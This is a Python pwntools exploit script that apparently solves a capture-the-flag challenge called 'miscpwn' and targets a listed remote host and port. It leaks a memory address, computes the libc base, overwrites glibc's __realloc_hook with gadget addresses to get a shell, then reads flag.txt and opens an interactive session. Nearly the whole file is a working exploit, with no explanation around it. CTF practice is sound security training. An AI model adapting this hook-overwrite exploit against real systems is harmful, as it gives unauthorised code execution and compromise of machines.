#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal=["tmux", "sp", "-h"]
context.log_level = "debug"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./miscpwn")


RHOST = "51.158.118.84"
RPORT = 17004
LHOST = "127.0.0.1"
LPORT = 31337

p = None
choose = sys.argv.pop(1) if len(sys.argv) > 1 else '?'
if choose in 'remote':
    p = remote(*{'remote': (RHOST, RPORT)}[choose])

if choose in 'local':
	p = remote(*{'local': (LHOST, LPORT)}[choose])

elif choose == 'debug':
    gdbscript = """
    c
    """
    p = gdb.debug(['./miscpwn'], gdbscript=gdbscript)
else:
    #p = process(['./miscpwn'])
    p = process(['./miscpwn'], env={'LD_PRELOAD': 'libc.so.6'})
    if choose == 'attach': gdb.attach(p)


p.sendlineafter(":\n", str(0x300000))
base_addr = int(p.recvline(), 16)
log.info("base_addr : "+hex(base_addr))
libc_base = base_addr + 0x300ff0
log.info("libc base : " + hex(libc_base))

offset = libc_base + libc.symbols["__realloc_hook"] - base_addr
log.info("distance : "+hex(offset))
p.sendlineafter(":\n", hex(offset)[2:]) #remove 0x


payload  = p64(libc_base + 0x501e3)
payload += p64(libc_base + 0x105ae0)
p.sendafter(":\n", payload)

p.sendline("cat flag.txt")



p.interactive()